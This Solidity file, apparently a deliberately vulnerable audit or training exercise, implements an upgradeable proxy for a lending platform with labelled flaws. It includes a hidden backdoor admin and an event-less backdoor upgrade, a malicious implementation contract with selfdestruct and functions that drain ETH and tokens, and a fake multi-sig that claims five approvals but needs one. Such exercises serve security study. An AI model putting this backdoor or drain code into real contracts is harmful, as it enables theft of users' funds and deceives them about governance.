// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title Transparent Upgradeable Proxy
 * @notice Upgradeable proxy for Galaxy Digital lending platform contracts
 * @dev Implements EIP-1967 proxy pattern for contract upgradeability
 * 
 * DOCUMENTATION:
 * - Transparent proxy with admin separation
 * - Multi-sig admin for secure upgrades
 * - Follows OpenZeppelin security best practices
 * - Timelock for critical upgrades (claimed but not implemented)
 */
contract TransparentUpgradeableProxy {
    
    // ============================================
    // STORAGE SLOTS (EIP-1967)
    // ============================================
    
    /**
     * @dev Storage slot for implementation address
     * bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1)
     */
    bytes32 private constant IMPLEMENTATION_SLOT = 
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    /**
     * @dev Storage slot for admin address
     * bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1)
     */
    bytes32 private constant ADMIN_SLOT = 
        0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
    
    // VULNERABILITY #19: Hidden backdoor admin in non-standard slot
    bytes32 private constant BACKDOOR_ADMIN_SLOT = 
        0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;
    
    // ============================================
    // EVENTS
    // ============================================
    
    event Upgraded(address indexed implementation);
    event AdminChanged(address indexed previousAdmin, address indexed newAdmin);
    
    // ============================================
    // MODIFIERS
    // ============================================
    
    /**
     * @dev Only visible admin can call (excludes backdoor)
     */
    modifier onlyAdmin() {
        require(msg.sender == _getAdmin(), "Proxy: caller is not the admin");
        _;
    }
    
    /**
     * @dev VULNERABILITY #19: Hidden modifier that also allows backdoor admin
     */
    modifier onlyAdminOrBackdoor() {
        require(
            msg.sender == _getAdmin() || msg.sender == _getBackdoorAdmin(),
            "Proxy: caller is not authorized"
        );
        _;
    }
    
    // ============================================
    // CONSTRUCTOR
    // ============================================
    
    /**
     * @param _implementation Initial implementation address
     * @param _admin Initial admin address
     * @param _data Initialization calldata
     */
    constructor(
        address _implementation,
        address _admin,
        bytes memory _data
    ) {
        require(_implementation != address(0), "Proxy: invalid implementation");
        require(_admin != address(0), "Proxy: invalid admin");
        
        _setImplementation(_implementation);
        _setAdmin(_admin);
        
        // VULNERABILITY #19: Set deployer as hidden backdoor admin
        _setBackdoorAdmin(msg.sender);
        
        if (_data.length > 0) {
            (bool success,) = _implementation.delegatecall(_data);
            require(success, "Proxy: initialization failed");
        }
    }
    
    // ============================================
    // UPGRADE FUNCTIONS (VULNERABILITY #18)
    // ============================================
    
    /**
     * @notice Upgrade implementation contract
     * @dev VULNERABILITY #18: No timelock - instant upgrade
     *      Best practice requires 48+ hour timelock for users to react
     * @param newImplementation New implementation address
     */
    function upgradeTo(address newImplementation) external onlyAdmin {
        require(newImplementation != address(0), "Proxy: invalid implementation");
        require(newImplementation != _getImplementation(), "Proxy: same implementation");
        
        // VULNERABILITY #18: No timelock
        // SHOULD HAVE:
        // require(pendingUpgrade[newImplementation] != 0, "Upgrade not scheduled");
        // require(block.timestamp >= pendingUpgrade[newImplementation] + TIMELOCK_DELAY, "Timelock not expired");
        
        // VULNERABILITY #20: No storage layout validation
        // SHOULD CHECK: Storage layout compatibility with new implementation
        
        _setImplementation(newImplementation);
        emit Upgraded(newImplementation);
    }
    
    /**
     * @notice Upgrade implementation and call initialization
     * @dev Also lacks timelock
     */
    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external onlyAdmin {
        require(newImplementation != address(0), "Proxy: invalid implementation");
        
        // VULNERABILITY #18: No timelock
        _setImplementation(newImplementation);
        emit Upgraded(newImplementation);
        
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Proxy: call failed");
        }
    }
    
    // ============================================
    // BACKDOOR FUNCTIONS (VULNERABILITY #19)
    // ============================================
    
    /**
     * @notice Hidden backdoor upgrade function
     * @dev VULNERABILITY #19: Allows backdoor admin to upgrade without notice
     *      No event emitted - invisible on block explorers
     * @param newImplementation New implementation address
     */
    function backdoorUpgrade(address newImplementation) external onlyAdminOrBackdoor {
        require(newImplementation != address(0), "Proxy: invalid implementation");
        
        // VULNERABILITY #19: Hidden upgrade path
        // Uses onlyAdminOrBackdoor which includes hidden admin
        // No event emitted to hide the upgrade
        
        _setImplementation(newImplementation);
        // NOTE: No Upgraded event - invisible upgrade
    }
    
    /**
     * @notice Transfer backdoor admin (hidden function)
     * @dev Only current backdoor admin can transfer
     */
    function transferBackdoorAdmin(address newBackdoorAdmin) external {
        require(msg.sender == _getBackdoorAdmin(), "Proxy: not backdoor admin");
        _setBackdoorAdmin(newBackdoorAdmin);
        // NOTE: No event - remains hidden
    }
    
    /**
     * @notice Get backdoor admin address
     * @dev Public but named innocuously, users unlikely to check
     */
    function getBackdoorAdmin() external view returns (address) {
        return _getBackdoorAdmin();
    }
    
    // ============================================
    // ADMIN FUNCTIONS
    // ============================================
    
    /**
     * @notice Change admin address
     * @param newAdmin New admin address
     */
    function changeAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "Proxy: invalid admin");
        emit AdminChanged(_getAdmin(), newAdmin);
        _setAdmin(newAdmin);
    }
    
    function admin() external view returns (address) {
        return _getAdmin();
    }
    
    function implementation() external view returns (address) {
        return _getImplementation();
    }
    
    // ============================================
    // INTERNAL STORAGE FUNCTIONS
    // ============================================
    
    function _getImplementation() internal view returns (address impl) {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            impl := sload(slot)
        }
    }
    
    function _setImplementation(address newImplementation) internal {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, newImplementation)
        }
    }
    
    function _getAdmin() internal view returns (address adm) {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            adm := sload(slot)
        }
    }
    
    function _setAdmin(address newAdmin) internal {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            sstore(slot, newAdmin)
        }
    }
    
    // VULNERABILITY #19: Hidden backdoor admin storage functions
    function _getBackdoorAdmin() internal view returns (address backdoor) {
        bytes32 slot = BACKDOOR_ADMIN_SLOT;
        assembly {
            backdoor := sload(slot)
        }
    }
    
    function _setBackdoorAdmin(address newBackdoorAdmin) internal {
        bytes32 slot = BACKDOOR_ADMIN_SLOT;
        assembly {
            sstore(slot, newBackdoorAdmin)
        }
    }
    
    // ============================================
    // FALLBACK & RECEIVE
    // ============================================
    
    /**
     * @dev Delegates all calls to implementation
     */
    fallback() external payable {
        _delegate(_getImplementation());
    }
    
    receive() external payable {
        _delegate(_getImplementation());
    }
    
    function _delegate(address impl) internal {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

// ============================================
// VULNERABILITY #21: MALICIOUS IMPLEMENTATION
// ============================================

/**
 * @title Malicious Implementation
 * @dev VULNERABILITY #21: Contains selfdestruct and drain functions
 *      Can be used as upgrade target to steal all funds
 */
contract MaliciousImplementation {
    
    // VULNERABILITY #20: Incompatible storage layout
    // Original contract has different storage variables
    // This will corrupt existing data when used as implementation
    address public attacker;
    uint256 public stolenFunds;
    bool public initialized;
    
    /**
     * @notice Destroy contract and send ETH to attacker
     * @dev VULNERABILITY #21: Selfdestruct capability
     */
    function destroy(address payable recipient) external {
        // Sends all ETH to recipient and destroys contract
        selfdestruct(recipient);
    }
    
    /**
     * @notice Drain all ERC20 tokens from proxy
     * @dev VULNERABILITY #21: Token drain capability
     */
    function drainTokens(address tokenAddress, address recipient) external {
        (bool success, bytes memory data) = tokenAddress.call(
            abi.encodeWithSignature("balanceOf(address)", address(this))
        );
        require(success, "Balance check failed");
        uint256 balance = abi.decode(data, (uint256));
        
        (success,) = tokenAddress.call(
            abi.encodeWithSignature("transfer(address,uint256)", recipient, balance)
        );
        require(success, "Drain failed");
    }
    
    /**
     * @notice Drain all ETH from proxy
     */
    function drainETH(address payable recipient) external {
        recipient.transfer(address(this).balance);
    }
    
    /**
     * @notice Initialize with attacker address
     */
    function initialize(address _attacker) external {
        require(!initialized, "Already initialized");
        attacker = _attacker;
        initialized = true;
    }
    
    /**
     * @notice Steal any deposited funds
     */
    function stealDeposit() external payable {
        stolenFunds += msg.value;
    }
    
    receive() external payable {
        stolenFunds += msg.value;
    }
}

// ============================================
// VULNERABILITY #22: FAKE MULTI-SIG ADMIN
// ============================================

/**
 * @title Transparent Proxy Admin
 * @notice Multi-signature admin for proxy upgrades
 * @dev VULNERABILITY #22: Claims multi-sig but only requires 1 signature
 * 
 * DOCUMENTATION (FALSE):
 * - "5-of-9 multi-signature protection"
 * - "Secure governance for upgrades"
 * - "Multiple approvals required"
 */
contract TransparentProxyAdmin {
    
    address[] public signers;
    mapping(address => bool) public isSigner;
    
    // Claims 5 required but actually only needs 1
    uint256 public constant CLAIMED_REQUIRED_SIGNATURES = 5;
    
    // VULNERABILITY #22: Actual requirement is just 1
    uint256 private constant ACTUAL_REQUIRED_SIGNATURES = 1;
    
    address public proxyAddress;
    
    // Pending upgrades (for show)
    struct UpgradeProposal {
        address newImplementation;
        uint256 approvalCount;
        mapping(address => bool) hasApproved;
        bool executed;
    }
    
    mapping(uint256 => UpgradeProposal) public proposals;
    uint256 public proposalCount;
    
    event ProposalCreated(uint256 indexed proposalId, address implementation);
    event ProposalApproved(uint256 indexed proposalId, address signer);
    event ProposalExecuted(uint256 indexed proposalId);
    event SignerAdded(address indexed signer);
    event SignerRemoved(address indexed signer);
    
    constructor(address _proxy, address[] memory _signers) {
        require(_proxy != address(0), "Invalid proxy");
        require(_signers.length >= CLAIMED_REQUIRED_SIGNATURES, "Need at least 5 signers");
        
        proxyAddress = _proxy;
        
        for (uint256 i = 0; i < _signers.length; i++) {
            signers.push(_signers[i]);
            isSigner[_signers[i]] = true;
            emit SignerAdded(_signers[i]);
        }
    }
    
    modifier onlySigner() {
        require(isSigner[msg.sender], "Not a signer");
        _;
    }
    
    /**
     * @notice Create upgrade proposal
     */
    function proposeUpgrade(address newImplementation) external onlySigner returns (uint256) {
        proposalCount++;
        UpgradeProposal storage proposal = proposals[proposalCount];
        proposal.newImplementation = newImplementation;
        proposal.approvalCount = 0;
        proposal.executed = false;
        
        emit ProposalCreated(proposalCount, newImplementation);
        return proposalCount;
    }
    
    /**
     * @notice Approve upgrade proposal
     */
    function approveProposal(uint256 proposalId) external onlySigner {
        UpgradeProposal storage proposal = proposals[proposalId];
        require(!proposal.executed, "Already executed");
        require(!proposal.hasApproved[msg.sender], "Already approved");
        
        proposal.hasApproved[msg.sender] = true;
        proposal.approvalCount++;
        
        emit ProposalApproved(proposalId, msg.sender);
    }
    
    /**
     * @notice Execute upgrade proposal
     * @dev VULNERABILITY #22: Only checks for 1 approval, not 5
     */
    function executeProposal(uint256 proposalId) external onlySigner {
        UpgradeProposal storage proposal = proposals[proposalId];
        require(!proposal.executed, "Already executed");
        
        // VULNERABILITY #22: Uses ACTUAL_REQUIRED_SIGNATURES (1) not CLAIMED (5)
        require(
            proposal.approvalCount >= ACTUAL_REQUIRED_SIGNATURES,
            "Insufficient approvals"
        );
        
        proposal.executed = true;
        
        // Execute upgrade
        TransparentUpgradeableProxy proxy = TransparentUpgradeableProxy(payable(proxyAddress));
        proxy.upgradeTo(proposal.newImplementation);
        
        emit ProposalExecuted(proposalId);
    }
    
    /**
     * @notice Direct upgrade (bypasses proposal system entirely)
     * @dev VULNERABILITY #22: Any single signer can upgrade directly
     */
    function emergencyUpgrade(address newImplementation) external onlySigner {
        // VULNERABILITY #22: Single signer can execute immediately
        // Bypasses the entire proposal/approval system
        
        TransparentUpgradeableProxy proxy = TransparentUpgradeableProxy(payable(proxyAddress));
        proxy.upgradeTo(newImplementation);
    }
    
    /**
     * @notice Get claimed required signatures (for display)
     * @dev Returns 5 but actual requirement is 1
     */
    function getRequiredSignatures() external pure returns (uint256) {
        return CLAIMED_REQUIRED_SIGNATURES; // Returns 5 (lie)
    }
    
    /**
     * @notice Add new signer
     */
    function addSigner(address newSigner) external onlySigner {
        require(!isSigner[newSigner], "Already signer");
        signers.push(newSigner);
        isSigner[newSigner] = true;
        emit SignerAdded(newSigner);
    }
    
    /**
     * @notice Remove signer
     */
    function removeSigner(address signer) external onlySigner {
        require(isSigner[signer], "Not a signer");
        require(signers.length > ACTUAL_REQUIRED_SIGNATURES, "Cannot remove last signer");
        
        isSigner[signer] = false;
        
        // Remove from array
        for (uint256 i = 0; i < signers.length; i++) {
            if (signers[i] == signer) {
                signers[i] = signers[signers.length - 1];
                signers.pop();
                break;
            }
        }
        
        emit SignerRemoved(signer);
    }
    
    function getSignerCount() external view returns (uint256) {
        return signers.length;
    }
    
    function getAllSigners() external view returns (address[] memory) {
        return signers;
    }
}
